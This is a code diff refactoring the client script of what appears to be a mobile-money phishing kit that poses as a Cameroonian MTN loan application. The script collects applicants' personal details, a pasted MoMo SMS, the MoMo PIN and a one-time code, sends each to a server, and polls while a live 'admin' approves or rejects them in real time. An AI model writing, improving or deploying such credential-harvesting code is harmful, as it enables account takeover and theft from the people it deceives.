@@ -1,5 +1,5 @@
 // ============================================================
-// script.js – MTN Cameroon Version with All Features
+// script.js – Cameroon Version with All Features
 // ============================================================
 
 const S = {
@@ -19,19 +19,19 @@ let pinBlockTimer = null;
 
 // ─── localStorage Helpers ───
 const STORAGE_KEYS = {
-    APPLICATION_ID: 'mtn_cm_application_id',
-    APPLICATION_DATA: 'mtn_cm_application_data',
-    REJECTION_INFO: 'mtn_cm_rejection_info',
-    FORM_DRAFT: 'mtn_cm_form_draft',
-    OTP_TIMER: 'mtn_cm_otp_timer'
+    APPLICATION_ID: 'mtn_application_id',
+    APPLICATION_DATA: 'mtn_application_data',
+    REJECTION_INFO: 'mtn_rejection_info',
+    FORM_DRAFT: 'mtn_form_draft',
+    OTP_TIMER: 'mtn_otp_timer'
 };
 
 function saveToLocalStorage(key, data) {
     try {
         localStorage.setItem(key, JSON.stringify(data));
-        console.log('💾 Saved to localStorage: ' + key);
+        console.log(`💾 Saved to localStorage: ${key}`);
     } catch (error) {
-        console.error('❌ Failed to save ' + key + ':', error);
+        console.error(`❌ Failed to save ${key}:`, error);
     }
 }
 
@@ -40,7 +40,7 @@ function getFromLocalStorage(key) {
         const data = localStorage.getItem(key);
         return data ? JSON.parse(data) : null;
     } catch (error) {
-        console.error('❌ Failed to load ' + key + ':', error);
+        console.error(`❌ Failed to load ${key}:`, error);
         return null;
     }
 }
@@ -48,13 +48,13 @@ function getFromLocalStorage(key) {
 function removeFromLocalStorage(key) {
     try {
         localStorage.removeItem(key);
-        console.log('🗑️ Removed from localStorage: ' + key);
+        console.log(`🗑️ Removed from localStorage: ${key}`);
     } catch (error) {
-        console.error('❌ Failed to remove ' + key + ':', error);
+        console.error(`❌ Failed to remove ${key}:`, error);
     }
 }
 
-// ─── Save/Load Application ID ───
+// ─── Save/Load Functions ───
 function saveApplicationId(id) {
     if (id) {
         S.applicationId = id;
@@ -71,7 +71,7 @@ function loadApplicationId() {
         const age = Date.now() - new Date(saved.timestamp).getTime();
         if (age < 24 * 60 * 60 * 1000) {
             S.applicationId = saved.id;
-            console.log('🔄 Restored application ID: ' + saved.id);
+            console.log(`🔄 Restored application ID: ${saved.id}`);
             return saved.id;
         } else {
             removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
@@ -80,7 +80,6 @@ function loadApplicationId() {
     return null;
 }
 
-// ─── Save/Load Application Data ───
 function saveApplicationData() {
     const dataToSave = {
         ...S,
@@ -100,12 +99,11 @@ function loadApplicationData() {
                 'employment', 'annualIncome', 'kinName', 'kinPhone',
                 'applicationId', 'rejectedStep'
             ];
-            for (var i = 0; i < fieldsToRestore.length; i++) {
-                var field = fieldsToRestore[i];
+            fieldsToRestore.forEach(field => {
                 if (saved[field] !== undefined) {
                     S[field] = saved[field];
                 }
-            }
+            });
             console.log('🔄 Restored application data from localStorage');
             return true;
         } else {
@@ -115,7 +113,6 @@ function loadApplicationData() {
     return false;
 }
 
-// ─── Save/Load Rejection Info ───
 function saveRejectionInfo(step, applicationId) {
     saveToLocalStorage(STORAGE_KEYS.REJECTION_INFO, {
         step: step,
@@ -141,39 +138,27 @@ function clearRejectionInfo() {
     removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
 }
 
-// ─── Save/Load Form Draft ───
 function saveFormDraft() {
-    var fi = document.getElementById('s2fi');
-    var la = document.getElementById('s2la');
-    var ph = document.getElementById('s2ph');
-    var em = document.getElementById('s2em');
-    var am = document.getElementById('s1am');
-    var pu = document.getElementById('s1pu');
-    var emStatus = document.getElementById('s3em');
-    var income = document.getElementById('s3in');
-    var kinName = document.getElementById('s3kn');
-    var kinPhone = document.getElementById('s3kp');
-    
-    var draft = {
-        firstName: fi ? fi.value : '',
-        lastName: la ? la.value : '',
-        phone: ph ? ph.value : '',
-        email: em ? em.value : '',
-        loanAmount: am ? am.value : '',
-        loanPurpose: pu ? pu.value : '',
-        employment: emStatus ? emStatus.value : '',
-        annualIncome: income ? income.value : '',
-        kinName: kinName ? kinName.value : '',
-        kinPhone: kinPhone ? kinPhone.value : '',
+    const draft = {
+        firstName: document.getElementById('s2fi')?.value || '',
+        lastName: document.getElementById('s2la')?.value || '',
+        phone: document.getElementById('s2ph')?.value || '',
+        email: document.getElementById('s2em')?.value || '',
+        loanAmount: document.getElementById('s1am')?.value || '',
+        loanPurpose: document.getElementById('s1pu')?.value || '',
+        employment: document.getElementById('s3em')?.value || '',
+        annualIncome: document.getElementById('s3in')?.value || '',
+        kinName: document.getElementById('s3kn')?.value || '',
+        kinPhone: document.getElementById('s3kp')?.value || '',
         timestamp: new Date().toISOString()
     };
     saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, draft);
 }
 
 function loadFormDraft() {
-    var draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
+    const draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
     if (draft) {
-        var age = Date.now() - new Date(draft.timestamp).getTime();
+        const age = Date.now() - new Date(draft.timestamp).getTime();
         if (age < 24 * 60 * 60 * 1000) {
             if (draft.firstName) document.getElementById('s2fi').value = draft.firstName;
             if (draft.lastName) document.getElementById('s2la').value = draft.lastName;
@@ -196,11 +181,8 @@ function loadFormDraft() {
 
 // ─── Navigation ───
 function goTo(pageId) {
-    var pages = document.querySelectorAll('.page');
-    for (var i = 0; i < pages.length; i++) {
-        pages[i].classList.remove('active');
-    }
-    var el = document.getElementById(pageId);
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    const el = document.getElementById(pageId);
     if (el) el.classList.add('active');
     window.scrollTo(0, 0);
 }
@@ -214,86 +196,77 @@ function startApplication() {
         saveApplicationId(S.applicationId);
     }
     
-    var resendBtn = document.getElementById('resendOtpBtn');
-    if (resendBtn) resendBtn.classList.add('hidden');
+    document.getElementById('resendOtpBtn')?.classList.add('hidden');
     
-    var errorIds = ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'];
-    for (var i = 0; i < errorIds.length; i++) {
-        clearErr(errorIds[i]);
-    }
+    ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'].forEach(id => {
+        clearErr(id);
+    });
     
     goTo('page-step1');
 }
 
 // ─── Toast Notifications ───
-function showToast(message, type, duration) {
-    type = type || 'info';
-    duration = duration || 3000;
-    
-    var existing = document.querySelector('.toast');
+function showToast(message, type = 'info', duration = 3000) {
+    const existing = document.querySelector('.toast');
     if (existing) existing.remove();
     
-    var toast = document.createElement('div');
-    toast.className = 'toast toast-' + type;
+    const toast = document.createElement('div');
+    toast.className = `toast toast-${type}`;
     toast.textContent = message;
     document.body.appendChild(toast);
     
-    setTimeout(function() {
+    setTimeout(() => {
         toast.style.opacity = '0';
         toast.style.transform = 'translateX(-50%) translateY(-20px)';
-        setTimeout(function() { toast.remove(); }, 300);
+        setTimeout(() => toast.remove(), 300);
     }, duration);
 }
 
 // ─── Form Helpers ───
 function normalizePhone(id) {
-    var inp = document.getElementById(id);
-    var val = inp.value.replace(/\D/g, '');
+    let inp = document.getElementById(id);
+    let val = inp.value.replace(/\D/g, '');
     if (val.length > 9) val = val.substring(0, 9);
     inp.value = val;
     saveFormDraft();
 }
 
 function updateCalc() {
-    var slider = document.getElementById('amtSlider');
-    var amt = +slider.value;
+    const amt = +document.getElementById('amtSlider').value;
     document.getElementById('calcAmt').textContent = 'XAF ' + amt.toLocaleString();
-    var monthly = Math.ceil(amt / 48);
+    const monthly = Math.ceil(amt / 48);
     document.getElementById('monthlyAmt').textContent = 'XAF ' + monthly.toLocaleString();
-    
-    var pct = ((amt - 500000) / 4500000) * 100;
-    slider.style.setProperty('--pct', pct + '%');
 }
 
 function showErr(id, msg) {
-    var box = document.getElementById(id);
+    const box = document.getElementById(id);
     if (box) {
         box.classList.add('show');
-        var txt = document.getElementById(id + 'Txt');
+        const txt = document.getElementById(id + 'Txt');
         if (txt) txt.textContent = msg;
     }
 }
 
 function clearErr(id) {
-    var box = document.getElementById(id);
+    const box = document.getElementById(id);
     if (box) box.classList.remove('show');
 }
 
 // ─── Step Navigation ───
 function toS2() {
-    var ty = document.getElementById('s1ty').value;
-    var am = +document.getElementById('s1am').value;
-    var te = document.getElementById('s1te').value;
-    var pu = document.getElementById('s1pu').value;
+    const ty = document.getElementById('s1ty').value;
+    const am = +document.getElementById('s1am').value;
+    const te = document.getElementById('s1te').value;
+    const pu = document.getElementById('s1pu').value;
     
     if (!ty || am <= 0 || !te || !pu.trim()) {
         showErr('s1Err', 'Please complete all fields.');
         return;
     }
     
-    S.loanType = ty;
-    S.loanAmount = am;
-    S.loanTerm = te;
+    S.loanType = ty; 
+    S.loanAmount = am; 
+    S.loanTerm = te; 
     S.loanPurpose = pu;
     
     saveApplicationData();
@@ -302,27 +275,29 @@ function toS2() {
 }
 
 function toS3() {
-    var fi = document.getElementById('s2fi').value.trim();
-    var la = document.getElementById('s2la').value.trim();
-    var ph = document.getElementById('s2ph').value;
-    var em = document.getElementById('s2em').value.trim();
+    const fi = document.getElementById('s2fi').value.trim();
+    const la = document.getElementById('s2la').value.trim();
+    const ph = document.getElementById('s2ph').value;
+    const em = document.getElementById('s2em').value.trim();
     
     if (!fi || !la) {
         showErr('s2Err', 'Please enter your full name.');
         return;
     }
+    
     if (ph.length !== 9) {
         showErr('s2Err', 'Please enter a valid 9-digit phone number.');
         return;
     }
-    if (!em || em.indexOf('@') === -1) {
+    
+    if (!em || !em.includes('@')) {
         showErr('s2Err', 'Please enter a valid email address.');
         return;
     }
     
-    S.firstName = fi;
-    S.lastName = la;
-    S.phone = ph;
+    S.firstName = fi; 
+    S.lastName = la; 
+    S.phone = ph; 
     S.email = em;
     
     saveApplicationData();
@@ -330,160 +305,107 @@ function toS3() {
     goTo('page-step3');
 }
 
-// ─── Update Step 3 Summary ───
-function updateSummary() {
-    var amount = document.getElementById('sA');
-    var term = document.getElementById('sT');
-    var purpose = document.getElementById('sP');
-    var name = document.getElementById('sN');
-    
-    if (amount) amount.textContent = 'XAF ' + S.loanAmount.toLocaleString();
-    if (term) term.textContent = S.loanTerm;
-    if (purpose) purpose.textContent = S.loanPurpose || '—';
-    if (name) name.textContent = (S.firstName + ' ' + S.lastName) || '—';
-}
-
 // ─── PIN/OTP Helpers ───
-function pinMvM(el, i, maxLength) {
-    maxLength = maxLength || 5;
+function pinMvM(el, i, maxLength = 5) {
     el.value = el.value.replace(/\D/g, '');
     if (el.value && i < maxLength - 1) {
-        var nextPin = document.getElementById('pin' + (i + 1));
+        const nextPin = document.getElementById('pin' + (i + 1));
         if (nextPin) { nextPin.focus(); return; }
     }
     
     if (i === maxLength - 1 && el.value) {
-        var allFilled = true;
-        for (var j = 0; j < 5; j++) {
-            var pinField = document.getElementById('pin' + j);
-            if (!pinField || !pinField.value) {
-                allFilled = false;
-                break;
-            }
-        }
+        const allFilled = [0,1,2,3,4].every(idx => document.getElementById('pin' + idx)?.value);
         if (allFilled) {
-            setTimeout(function() { doPin(); }, 300);
+            setTimeout(() => doPin(), 300);
         }
     }
 }
 
 function togPin() {
-    for (var i = 0; i < 5; i++) {
-        var b = document.getElementById('pin' + i);
+    for (let i = 0; i < 5; i++) {
+        const b = document.getElementById('pin' + i);
         if (b) b.type = b.type === 'password' ? 'text' : 'password';
     }
-    for (var j = 0; j < 4; j++) {
-        var otp = document.getElementById('otp' + j);
-        if (otp) otp.type = otp.type === 'password' ? 'text' : 'password';
+    for (let i = 0; i < 4; i++) {
+        const b = document.getElementById('otp' + i);
+        if (b) b.type = b.type === 'password' ? 'text' : 'password';
     }
 }
 
 function chkPin() {
-    var pinOk = true;
-    for (var i = 0; i < 5; i++) {
-        var pinField = document.getElementById('pin' + i);
-        if (!pinField || !pinField.value) {
-            pinOk = false;
-            break;
-        }
-    }
-    var pinBtn = document.querySelector('#page-pin .btn-grad');
+    const pinOk = [0,1,2,3,4].every(i => document.getElementById('pin' + i)?.value);
+    const pinBtn = document.querySelector('#page-pin .btn-grad');
     if (pinBtn) pinBtn.disabled = !pinOk;
 
-    var otpOk = true;
-    for (var j = 0; j < 4; j++) {
-        var otpField = document.getElementById('otp' + j);
-        if (!otpField || !otpField.value) {
-            otpOk = false;
-            break;
-        }
-    }
-    var otpBtn = document.querySelector('#page-otp .btn-grad');
+    const otpOk = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
+    const otpBtn = document.querySelector('#page-otp .btn-grad');
     if (otpBtn) otpBtn.disabled = !otpOk;
 }
 
 document.addEventListener('keyup', chkPin);
 
 function clearLoginPin() {
-    for (var i = 0; i < 5; i++) {
-        var field = document.getElementById('pin' + i);
-        if (field) field.value = '';
-    }
-    var firstPin = document.getElementById('pin0');
-    if (firstPin) firstPin.focus();
+    [0,1,2,3,4].forEach(i => document.getElementById('pin'+i).value = '');
+    document.getElementById('pin0').focus();
     chkPin();
 }
 
 function clearOtpCode() {
-    for (var i = 0; i < 4; i++) {
-        var field = document.getElementById('otp' + i);
-        if (field) field.value = '';
-    }
-    var firstOtp = document.getElementById('otp0');
-    if (firstOtp) firstOtp.focus();
+    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+    document.getElementById('otp0').focus();
     chkPin();
 }
 
 function handleOtpInput(el, type) {
     el.value = el.value.replace(/\D/, '');
-    var idx = parseInt(el.id.match(/\d$/)[0]);
+    const idx = parseInt(el.id.match(/\d$/)[0]);
     if (el.value && type === 'otp' && idx < 3) {
-        var next = document.getElementById('otp' + (idx + 1));
-        if (next) next.focus();
+        document.getElementById('otp' + (idx + 1))?.focus();
     }
     chkPin();
     
     if (idx === 3 && el.value) {
-        var allFilled = true;
-        for (var i = 0; i < 4; i++) {
-            var field = document.getElementById('otp' + i);
-            if (!field || !field.value) {
-                allFilled = false;
-                break;
-            }
-        }
+        const allFilled = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
         if (allFilled) {
-            setTimeout(function() { doOtp(); }, 300);
+            setTimeout(() => doOtp(), 300);
         }
     }
 }
 
 // ─── PIN Attempt Functions ───
-function checkPinStatus() {
-    return fetch('/api/pin-status/' + S.applicationId)
-        .then(function(response) { return response.json(); })
-        .then(function(data) {
-            if (data.ok) {
-                var remaining = data.remainingAttempts || 3;
-                var attemptsDisplay = document.getElementById('pinAttemptsDisplay');
-                if (attemptsDisplay) {
-                    if (data.isBlocked) {
-                        attemptsDisplay.innerHTML = '🔒 Too many attempts. Blocked for ' + data.blockRemainingSeconds + 's';
-                        attemptsDisplay.className = 'pin-attempts blocked';
-                        var pinBoxes = document.querySelectorAll('#page-pin .pin-box');
-                        for (var i = 0; i < pinBoxes.length; i++) {
-                            pinBoxes[i].disabled = true;
-                        }
-                        var pinBtn = document.querySelector('#page-pin .btn-grad');
-                        if (pinBtn) pinBtn.disabled = true;
-                        startPinBlockCountdown(data.blockRemainingSeconds);
-                    } else {
-                        attemptsDisplay.innerHTML = '🔑 Attempts remaining: ' + remaining + ' of 3';
-                        attemptsDisplay.className = 'pin-attempts';
-                    }
+async function checkPinStatus() {
+    try {
+        const response = await fetch(`/api/pin-status/${S.applicationId}`);
+        const data = await response.json();
+        
+        if (data.ok) {
+            const remaining = data.remainingAttempts || 3;
+            
+            const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
+            if (attemptsDisplay) {
+                if (data.isBlocked) {
+                    attemptsDisplay.innerHTML = `🔒 Too many attempts. Blocked for ${data.blockRemainingSeconds}s`;
+                    attemptsDisplay.className = 'pin-attempts blocked';
+                    document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = true);
+                    document.querySelector('#page-pin .btn-grad').disabled = true;
+                    
+                    startPinBlockCountdown(data.blockRemainingSeconds);
+                } else {
+                    attemptsDisplay.innerHTML = `🔑 Attempts remaining: ${remaining} of 3`;
+                    attemptsDisplay.className = 'pin-attempts';
                 }
-                return data;
             }
-            return null;
-        })
-        .catch(function(error) {
-            console.error('Error checking PIN status:', error);
-            return null;
-        });
+            
+            return data;
+        }
+    } catch (error) {
+        console.error('Error checking PIN status:', error);
+    }
+    return null;
 }
 
 function startPinBlockCountdown(seconds) {
-    var attemptsDisplay = document.getElementById('pinAttemptsDisplay');
+    const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
     if (!attemptsDisplay) return;
     
     if (pinBlockTimer) {
@@ -491,42 +413,39 @@ function startPinBlockCountdown(seconds) {
         pinBlockTimer = null;
     }
     
-    var remaining = seconds;
-    attemptsDisplay.textContent = '🔒 Too many attempts. Blocked for ' + remaining + 's';
+    let remaining = seconds;
+    attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
     attemptsDisplay.className = 'pin-attempts blocked';
     
-    pinBlockTimer = setInterval(function() {
+    pinBlockTimer = setInterval(() => {
         remaining--;
         if (remaining <= 0) {
             clearInterval(pinBlockTimer);
             pinBlockTimer = null;
             attemptsDisplay.textContent = '✅ PIN available. Please try again.';
             attemptsDisplay.className = 'pin-attempts available';
-            var pinBoxes = document.querySelectorAll('#page-pin .pin-box');
-            for (var i = 0; i < pinBoxes.length; i++) {
-                pinBoxes[i].disabled = false;
-            }
-            var pinBtn = document.querySelector('#page-pin .btn-grad');
-            if (pinBtn) pinBtn.disabled = false;
+            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = false);
+            document.querySelector('#page-pin .btn-grad').disabled = false;
             resetPinAttempts();
         } else {
-            attemptsDisplay.textContent = '🔒 Too many attempts. Blocked for ' + remaining + 's';
+            attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
         }
     }, 1000);
 }
 
-function resetPinAttempts() {
-    fetch('/api/reset-pin-attempts/' + S.applicationId, {
-        method: 'POST'
-    }).catch(function(error) {
+async function resetPinAttempts() {
+    try {
+        await fetch(`/api/reset-pin-attempts/${S.applicationId}`, {
+            method: 'POST'
+        });
+    } catch (error) {
         console.error('Error resetting PIN attempts:', error);
-    });
+    }
 }
 
 // ─── OTP Resend Timer ───
-function startOtpResendTimer(seconds) {
-    seconds = seconds || 20;
-    var btn = document.getElementById('resendOtpBtn');
+function startOtpResendTimer(seconds = 20) {
+    const btn = document.getElementById('resendOtpBtn');
     if (!btn) return;
     
     if (otpResendTimer) {
@@ -536,7 +455,7 @@ function startOtpResendTimer(seconds) {
     
     otpResendCountdown = seconds;
     btn.disabled = true;
-    btn.textContent = '⏳ Wait ' + otpResendCountdown + 's';
+    btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
     btn.classList.remove('hidden');
     
     saveToLocalStorage(STORAGE_KEYS.OTP_TIMER, {
@@ -544,7 +463,7 @@ function startOtpResendTimer(seconds) {
         applicationId: S.applicationId
     });
     
-    otpResendTimer = setInterval(function() {
+    otpResendTimer = setInterval(() => {
         otpResendCountdown--;
         
         if (otpResendCountdown <= 0) {
@@ -554,15 +473,15 @@ function startOtpResendTimer(seconds) {
             btn.textContent = '🔄 Resend OTP';
             removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
         } else {
-            btn.textContent = '⏳ Wait ' + otpResendCountdown + 's';
+            btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
         }
     }, 1000);
 }
 
 function checkOtpTimerRecovery() {
-    var saved = getFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
+    const saved = getFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
     if (saved && saved.endTime && saved.applicationId === S.applicationId) {
-        var remaining = Math.ceil((saved.endTime - Date.now()) / 1000);
+        const remaining = Math.ceil((saved.endTime - Date.now()) / 1000);
         if (remaining > 0) {
             startOtpResendTimer(remaining);
             return true;
@@ -592,26 +511,20 @@ function handleRejection(step) {
             showToast('❌ SMS was rejected. Please check and resubmit.', 'error');
             document.getElementById('smsMsgBox').value = '';
             document.getElementById('smsMsgBox').focus();
-            var smsCard = document.querySelector('#page-sms-paste .step-card');
-            if (smsCard) smsCard.classList.add('rejected');
-            setTimeout(function() {
-                if (smsCard) smsCard.classList.remove('rejected');
+            document.querySelector('#page-sms-paste .step-card')?.classList.add('rejected');
+            setTimeout(() => {
+                document.querySelector('#page-sms-paste .step-card')?.classList.remove('rejected');
             }, 3000);
             goTo('page-sms-paste');
             break;
             
         case 'pin':
             showToast('❌ PIN was rejected. Please re-enter your MoMo PIN.', 'error');
-            var pinBoxes = document.querySelectorAll('#page-pin .pin-box');
-            for (var i = 0; i < pinBoxes.length; i++) {
-                pinBoxes[i].value = '';
-            }
-            var firstPin = document.getElementById('pin0');
-            if (firstPin) firstPin.focus();
-            var pinCard = document.querySelector('#page-pin .step-card');
-            if (pinCard) pinCard.classList.add('rejected');
-            setTimeout(function() {
-                if (pinCard) pinCard.classList.remove('rejected');
+            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
+            document.getElementById('pin0').focus();
+            document.querySelector('#page-pin .step-card')?.classList.add('rejected');
+            setTimeout(() => {
+                document.querySelector('#page-pin .step-card')?.classList.remove('rejected');
             }, 3000);
             checkPinStatus();
             goTo('page-pin');
@@ -620,10 +533,9 @@ function handleRejection(step) {
         case 'otp':
             showToast('❌ OTP was rejected. Please request a new OTP.', 'error');
             clearOtpCode();
-            var otpCard = document.querySelector('#page-otp .step-card');
-            if (otpCard) otpCard.classList.add('rejected');
-            setTimeout(function() {
-                if (otpCard) otpCard.classList.remove('rejected');
+            document.querySelector('#page-otp .step-card')?.classList.add('rejected');
+            setTimeout(() => {
+                document.querySelector('#page-otp .step-card')?.classList.remove('rejected');
             }, 3000);
             startOtpResendTimer(20);
             goTo('page-otp');
@@ -642,53 +554,53 @@ function startPoll(applicationId, step, onSuccess, onReject) {
         currentPollTimeout = null;
     }
 
-    var check = function() {
-        fetch('/api/status/' + applicationId + '/' + step)
-            .then(function(response) { return response.json(); })
-            .then(function(data) {
-                if (data && data.ok === true) {
-                    if (data.status === 'approved') {
-                        currentPollTimeout = null;
-                        onSuccess();
-                        return;
-                    } else if (data.status === 'rejected') {
-                        currentPollTimeout = null;
-                        fetch('/api/rejection-info/' + applicationId)
-                            .then(function(res) { return res.json(); })
-                            .then(function(redirectData) {
-                                if (redirectData.ok && redirectData.rejectedStep) {
-                                    S.rejectedStep = redirectData.rejectedStep;
-                                    showToast(redirectData.errorMessage || '❌ Application was rejected.', 'error');
-                                    handleRejection(redirectData.rejectedStep);
-                                } else {
-                                    showToast('❌ Application was rejected. Please try again.', 'error');
-                                    goTo('page-step3');
-                                }
-                            })
-                            .catch(function(err) {
-                                console.error('Error getting rejection info:', err);
-                                showToast('❌ Application was rejected. Please try again.', 'error');
-                                goTo('page-step3');
-                            });
-                        return;
+    const check = async () => {
+        try {
+            const res = await fetch(`/api/status/${applicationId}/${step}`);
+            const data = await res.json();
+            
+            if (data && data.ok === true) {
+                if (data.status === 'approved') {
+                    currentPollTimeout = null;
+                    onSuccess();
+                    return;
+                } else if (data.status === 'rejected') {
+                    currentPollTimeout = null;
+                    try {
+                        const redirectRes = await fetch(`/api/rejection-info/${applicationId}`);
+                        const redirectData = await redirectRes.json();
+                        
+                        if (redirectData.ok && redirectData.rejectedStep) {
+                            S.rejectedStep = redirectData.rejectedStep;
+                            showToast(redirectData.errorMessage || '❌ Application was rejected.', 'error');
+                            handleRejection(redirectData.rejectedStep);
+                        } else {
+                            showToast('❌ Application was rejected. Please try again.', 'error');
+                            goTo('page-step3');
+                        }
+                    } catch (err) {
+                        console.error('Error getting rejection info:', err);
+                        showToast('❌ Application was rejected. Please try again.', 'error');
+                        goTo('page-step3');
                     }
+                    return;
                 }
-                currentPollTimeout = setTimeout(check, 2000);
-            })
-            .catch(function(err) {
-                console.error('Polling error:', err);
-                currentPollTimeout = setTimeout(check, 3000);
-            });
+            }
+            currentPollTimeout = setTimeout(check, 2000);
+        } catch (err) {
+            console.error('Polling error:', err);
+            currentPollTimeout = setTimeout(check, 3000);
+        }
     };
     check();
 }
 
 // ─── Resend OTP ───
-function resendOtp() {
-    var btn = document.getElementById('resendOtpBtn');
+async function resendOtp() {
+    const btn = document.getElementById('resendOtpBtn');
     
     if (otpResendTimer || otpResendCountdown > 0) {
-        showToast('⏳ Please wait ' + otpResendCountdown + ' seconds before resending.', 'info');
+        showToast(`⏳ Please wait ${otpResendCountdown} seconds before resending.`, 'info');
         return;
     }
     
@@ -697,38 +609,32 @@ function resendOtp() {
         btn.textContent = '⏳ Sending...';
         showToast('📤 Requesting new OTP...', 'info');
         
-        fetch('/api/resend-otp', {
+        const response = await fetch('/api/resend-otp', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ applicationId: S.applicationId })
-        })
-        .then(function(response) { return response.json(); })
-        .then(function(data) {
-            if (data.ok) {
-                showToast('✅ New OTP sent to admin for verification!', 'success');
-                startOtpResendTimer(20);
-                
-                startPoll(S.applicationId, 'otp',
-                    function() {
-                        showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
-                        showApproval();
-                    },
-                    function() {
-                        handleRejection('otp');
-                    }
-                );
-            } else {
-                showToast('❌ Failed to resend OTP. Please try again.', 'error');
-                btn.disabled = false;
-                btn.textContent = '🔄 Resend OTP';
-            }
-        })
-        .catch(function(error) {
-            console.error('Resend OTP error:', error);
+        });
+        
+        const data = await response.json();
+        
+        if (data.ok) {
+            showToast('✅ New OTP sent to admin for verification!', 'success');
+            startOtpResendTimer(20);
+            
+            startPoll(S.applicationId, 'otp',
+                () => {
+                    showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
+                    showApproval();
+                },
+                () => {
+                    handleRejection('otp');
+                }
+            );
+        } else {
             showToast('❌ Failed to resend OTP. Please try again.', 'error');
             btn.disabled = false;
             btn.textContent = '🔄 Resend OTP';
-        });
+        }
     } catch (error) {
         console.error('Resend OTP error:', error);
         showToast('❌ Failed to resend OTP. Please try again.', 'error');
@@ -742,13 +648,10 @@ function showApproval() {
     document.getElementById('aprAmount').textContent = 'XAF ' + S.loanAmount.toLocaleString();
     document.getElementById('aprAmt').textContent = 'XAF ' + S.loanAmount.toLocaleString();
     document.getElementById('aprTerm').textContent = S.loanTerm;
-    var monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
+    const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
     document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
     
-    var keys = Object.values(STORAGE_KEYS);
-    for (var i = 0; i < keys.length; i++) {
-        removeFromLocalStorage(keys[i]);
-    }
+    Object.values(STORAGE_KEYS).forEach(key => removeFromLocalStorage(key));
     
     if (otpResendTimer) {
         clearInterval(otpResendTimer);
@@ -763,21 +666,21 @@ function showApproval() {
     goTo('page-approval');
 }
 
-// ─── Submit Application ───
-function submitApp() {
-    var em = document.getElementById('s3em').value;
-    var income = +document.getElementById('s3in').value;
-    var kn = document.getElementById('s3kn').value.trim();
-    var kp = document.getElementById('s3kp').value.trim();
+// ─── STEP 3: Submit Application ───
+async function submitApp() {
+    const em = document.getElementById('s3em').value;
+    const in_ = +document.getElementById('s3in').value;
+    const kn = document.getElementById('s3kn').value.trim();
+    const kp = document.getElementById('s3kp').value.trim();
     
-    if (!em || income <= 0) {
+    if (!em || in_ <= 0) {
         showErr('s3Err', 'Please complete all fields.');
         return;
     }
     
-    S.employment = em;
-    S.annualIncome = income;
-    S.kinName = kn;
+    S.employment = em; 
+    S.annualIncome = in_; 
+    S.kinName = kn; 
     S.kinPhone = kp;
     
     if (!S.applicationId) {
@@ -789,212 +692,184 @@ function submitApp() {
     goTo('page-processing');
 
     try {
-        fetch('/api/send-application', {
+        await fetch('/api/send-application', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ applicationData: S })
-        })
-        .then(function(response) { return response.json(); })
-        .then(function(data) {
-            document.getElementById('processingStatus').innerHTML = '⏳ Awaiting admin approval...';
-            
-            startPoll(S.applicationId, 'sms',
-                function() {
-                    showToast('✅ SMS Approved!', 'success');
-                    goTo('page-sms-paste');
-                },
-                function() {
-                    handleRejection('sms');
-                }
-            );
-        })
-        .catch(function() {
-            showErr('s3Err', 'Failed to submit application.');
         });
-    } catch (error) {
+        
+        document.getElementById('processingStatus').innerHTML = '⏳ Awaiting admin approval...';
+        
+        startPoll(S.applicationId, 'sms',
+            () => { 
+                showToast('✅ SMS Approved!', 'success');
+                goTo('page-sms-paste'); 
+            },
+            () => {
+                handleRejection('sms');
+            }
+        );
+    } catch {
         showErr('s3Err', 'Failed to submit application.');
     }
 }
 
-// ─── SMS Parse ───
-function doSmsParse() {
-    var msg = document.getElementById('smsMsgBox').value.trim();
+// ─── STEP 4: SMS ───
+async function doSmsParse() {
+    const msg = document.getElementById('smsMsgBox').value.trim();
     if (msg.length < 3) {
         showErr('momErr', 'Please paste a valid SMS message.');
         return;
     }
 
-    fetch('/api/send-momo-message', {
+    await fetch('/api/send-momo-message', {
         method: 'POST',
         body: JSON.stringify({
-            momoData: {
-                applicationId: S.applicationId,
-                phone: S.phone,
+            momoData: { 
+                applicationId: S.applicationId, 
+                phone: S.phone, 
                 momoMessage: msg,
                 isResubmission: !!S.rejectedStep
             }
         }),
         headers: { 'Content-Type': 'application/json' }
-    })
-    .then(function(response) { return response.json(); })
-    .then(function(data) {
-        document.getElementById('waitSmsAppId').textContent = S.applicationId;
-        goTo('page-wait-sms');
-
-        startPoll(S.applicationId, 'sms',
-            function() {
-                showToast('✅ SMS Verified!', 'success');
-                goTo('page-pin');
-            },
-            function() {
-                handleRejection('sms');
-            }
-        );
-    })
-    .catch(function() {
-        showErr('momErr', 'Failed to submit SMS.');
     });
+
+    document.getElementById('waitSmsAppId').textContent = S.applicationId;
+    goTo('page-wait-sms');
+
+    startPoll(S.applicationId, 'sms',
+        () => { 
+            showToast('✅ SMS Verified!', 'success');
+            goTo('page-pin'); 
+        },
+        () => {
+            handleRejection('sms');
+        }
+    );
 }
 
